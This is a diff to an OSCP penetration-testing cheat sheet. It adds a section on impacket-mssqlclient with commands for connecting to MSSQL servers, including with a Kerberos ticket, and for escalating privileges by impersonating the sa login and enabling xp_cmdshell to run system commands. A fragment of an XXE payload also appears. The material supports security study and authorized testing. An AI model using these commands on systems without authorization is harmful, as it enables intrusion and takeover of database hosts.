@@ -95,6 +95,7 @@ Thank you for reading.
 		- [WPScan](https://github.com/0xsyr0/OSCP#wpscan)
 		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
 	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
+ 		- [impacket-mssqlclient](https://github.com/0xsyr0/OSCP#impacket-mssqlclient)
 		- [MongoDB](https://github.com/0xsyr0/OSCP#mongodb)
 		- [MSSQL](https://github.com/0xsyr0/OSCP#mssql)
 		- [MySQL](https://github.com/0xsyr0/OSCP#mysql)
@@ -1920,6 +1921,36 @@ username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+S
 ```
 
 ### Database Analysis
+
+#### impacket-mssqlclient
+
+##### Common Commands
+
+```c
+enum_logins
+enum_impersonate
+```
+
+##### Connection
+
+```c
+impacket-mssqlclient <USERNAME>@<RHOST>
+impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
+sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
+```
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-mssqlclient -k <RHOST>.<DOMAIN>
+```
+
+##### Privilege Escalation
+
+```c
+exec_as_login sa
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
 
 #### MongoDB
 
